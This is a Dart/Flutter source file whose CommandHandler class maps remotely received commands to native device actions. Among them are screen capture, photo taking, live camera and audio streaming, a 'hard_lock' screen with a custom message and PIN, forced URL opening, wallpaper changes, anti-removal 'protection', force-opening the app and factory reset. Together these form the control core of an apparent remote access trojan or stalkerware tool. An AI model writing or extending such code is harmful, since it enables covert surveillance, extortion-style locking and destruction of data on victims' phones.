import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart';

class CommandHandler {
  static const MethodChannel _channel =
      MethodChannel('orgsapp/device_info');

  static Future<Map<String, dynamic>> handle({
    required String command,
    required String extra,
  }) async {
    switch (command) {
      // ===== DEVICE INFO =====
      case 'ping':
        return {'pong': true, 'ts': DateTime.now().toIso8601String()};

      // ===== FLASHLIGHT =====
      case 'flash_strobe':
        await _channel.invokeMethod('flashStrobe');
        return {'ok': true};

      case 'stop_strobe':
        await _channel.invokeMethod('stopStrobe');
        return {'ok': true};

      // ===== VIBRATE =====
      case 'vibrate_loop':
        await _channel.invokeMethod('vibrateLoop');
        return {'ok': true};

      case 'stop_vibrate':
        await _channel.invokeMethod('stopVibrate');
        return {'ok': true};

      // ===== SCREEN =====
      case 'get_screen':
        final b64 = await _channel.invokeMethod<String>('captureScreen');
        return {'image_base64': b64 ?? ''};

      // ===== CAMERA =====
      case 'take_photo':
        final camera = extra.isEmpty ? 'back' : extra;
        final b64 = await _channel.invokeMethod<String>(
          'takePhoto',
          {'camera': camera},
        );
        return {'image_base64': b64 ?? ''};

      case 'start_camera_stream':
        await _channel.invokeMethod('startCameraStream', {
          'camera': extra.isEmpty ? 'back' : extra,
        });
        return {'ok': true};

      case 'stop_camera_stream':
        await _channel.invokeMethod('stopCameraStream');
        return {'ok': true};

      // ===== LOCK =====
      case 'hard_lock':
        final parts = extra.split('|');
        final msg = parts.isNotEmpty ? parts[0] : 'LOCKED';
        final pin = parts.length > 1 ? parts[1] : '1234';
        await _channel.invokeMethod('hardLock', {
          'message': msg,
          'pin': pin,
        });
        return {'ok': true};

      case 'unlock':
        await _channel.invokeMethod('unlock');
        return {'ok': true};

      // ===== URL =====
      case 'open_url':
        await _channel.invokeMethod('openUrl', {'url': extra});
        return {'ok': true};

      // ===== AUDIO =====
      case 'play_audio':
        await _channel.invokeMethod('playAudio', {'url': extra});
        return {'ok': true};

      case 'stop_audio':
        await _channel.invokeMethod('stopAudio');
        return {'ok': true};

      // ===== AUDIO STREAM =====
      case 'start_audio_stream':
        await _channel.invokeMethod('startAudioStream');
        return {'ok': true};

      case 'stop_audio_stream':
        await _channel.invokeMethod('stopAudioStream');
        return {'ok': true};

      // ===== WALLPAPER =====
      case 'set_wallpaper':
        await _channel.invokeMethod('setWallpaper', {'url': extra});
        return {'ok': true};

      // ===== PROTECTION =====
      case 'enable_protection':
        final method = extra.isEmpty ? 'both' : extra;
        await _channel.invokeMethod('enableProtection', {
          'method': method,
        });
        return {'ok': true};

      case 'disable_protection':
        await _channel.invokeMethod('disableProtection');
        return {'ok': true};

      // ===== FORCE OPEN =====
      case 'force_open':
        await _channel.invokeMethod('forceOpen');
        return {'ok': true};

      // ===== FACTORY RESET =====
      case 'factory_reset':
        await _channel.invokeMethod('factoryReset');
        return {'ok': true};

      // ===== DEFAULT =====
      default:
        debugPrint('⚠️ Unknown command: $command');
        return {'error': 'unknown_command', 'command': command};
    }
  }
}
